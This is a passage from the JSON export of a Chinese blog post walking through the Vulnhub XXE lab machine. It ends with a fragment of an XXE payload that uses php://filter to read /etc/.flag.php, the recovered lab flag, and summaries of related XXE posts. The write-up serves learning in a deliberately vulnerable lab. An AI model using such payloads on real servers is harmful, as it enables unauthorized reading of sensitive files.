&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;.flag.php&quot;&gt;\n]&gt;\n&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>解密后得到乱码：<br><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220605235123485.png\" alt=\"image-20220605235123485\"></p>\n<h2 id=\"0x12\"><a href=\"#0x12\" class=\"headerlink\" title=\"0x12\"></a>0x12</h2><p>最后使用phpstudy创建1.php文件访问得到flag：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">flag：SAFCSP&#123;xxe_is_so_easy&#125; <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/Vulnhub-XXE%E9%9D%B6%E5%9C%BA.htm/image-20220606002026364.png\" alt=\"image-20220606002026364\"></p>\n<h2 id=\"0x13-总结\"><a href=\"#0x13-总结\" class=\"headerlink\" title=\"0x13 总结\"></a>0x13 总结</h2><p>这个靶机总体来说不是很难，玩过之后对XXE会有更深的了解，最主要还是细心观察。</p>\n","text":"0x00靶机地址：https://download.vulnhub.com/xxe/XXE.zip 攻击机：Ninjitsu OS 0x01打开靶机 0x02查看攻击机ip地址： 使用nmap扫描网段，查找靶机ip： nmap -sS 192.168.216.1&#x2F;24 ...","link":"","photos":[],"count_time":{"symbolsCount":"7.1k","symbolsTime":"6 mins."},"categories":[{"name":"XXE","slug":"XXE","count":4,"path":"api/categories/XXE.json"}],"tags":[{"name":"XXE","slug":"XXE","count":4,"path":"api/tags/XXE.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05\"><span class=\"toc-text\">0x05</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x06\"><span class=\"toc-text\">0x06</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x07\"><span class=\"toc-text\">0x07</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x08\"><span class=\"toc-text\">0x08</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x09\"><span class=\"toc-text\">0x09</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x10\"><span class=\"toc-text\">0x10</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x11\"><span class=\"toc-text\">0x11</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x12\"><span class=\"toc-text\">0x12</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x13-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">0x13 总结</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"XXE本地靶场","uid":"b0d1a06dcd6e0826834acbe52fab1564","slug":"XXE本地靶场","date":"2022-06-06T00:54:30.000Z","updated":"2022-06-06T02:24:04.412Z","comments":true,"path":"api/articles/XXE本地靶场.json","keywords":null,"cover":[],"text":"0x00 XXE-Lab0x00随便输入用户名和密码抓包观察： 可以看到用户名和密码是使用XML格式进行传输，并且数据包中Content-Type: 字段为application/xml;charset=utf-8带有xml字样，X-Requested-With: 字段为XMLH...","link":"","photos":[],"count_time":{"symbolsCount":"2.2k","symbolsTime":"2 mins."},"categories":[{"name":"XXE","slug":"XXE","count":4,"path":"api/categories/XXE.json"}],"tags":[{"name":"XXE","slug":"XXE","count":4,"path":"api/tags/XXE.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"XXE和XML-利用检测绕过","uid":"f59b4912b599c61d7ef7202907a014a6","slug":"XXE和XML-利用检测绕过","date":"2022-06-05T09:15:30.000Z","updated":"2022-06-06T01:08:06.472Z","comments":true,"path":"api/articles/XXE和XML-利用检测绕过.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 XML简介###0x00 1、XML指可扩展标记语言，它被设计用来传输和存储数据。（HTML被用来显示数据）2、XML没有预定义的标签，需要自行定义标签3、XML是不作为的，及它不存在任何的行为，只是用来结构化、传输和存储信息4、它仅仅是纯文字5、XML...","link":"","photos":[],"count_time":{"symbolsCount":"3.4k","symbolsTime":"3 mins."},"categories":[{"name":"XXE","slug":"XXE","count":4,"path":"api/categories/XXE.json"}],"tags":[{"name":"XXE","slug":"XXE","count":4,"path":"api/tags/XXE.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}